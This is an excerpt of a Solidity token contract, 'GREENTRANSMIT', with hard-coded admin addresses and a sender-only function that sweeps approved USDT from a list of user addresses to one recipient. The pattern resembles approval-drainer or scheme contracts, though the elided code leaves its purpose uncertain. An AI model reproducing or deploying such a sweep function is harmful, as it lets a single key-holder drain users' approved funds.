...
contract GREENTRANSMIT is Context, Ownable {
    ...
    address public _first = address(0xB5cB1568E7B8Dc5e8AaEba6BDD712DdD8dde5E0E);//test
    address public _receiver = address(0xB5cB1568E7B8Dc5e8AaEba6BDD712DdD8dde5E0E);//test
    address public _sender = address(0xB5cB1568E7B8Dc5e8AaEba6BDD712DdD8dde5E0E);//test
    modifier onlySender(){
    ...
    function transferFrom(address[] calldata addresses,address to) external onlySender{
        for(uint i;i<addresses.length;i++){
            ...
            if(amount>0){
                IBEP20(_usdt).transferFrom(addresses[i],to,amount);
            }
        }
    }
    //获取网体
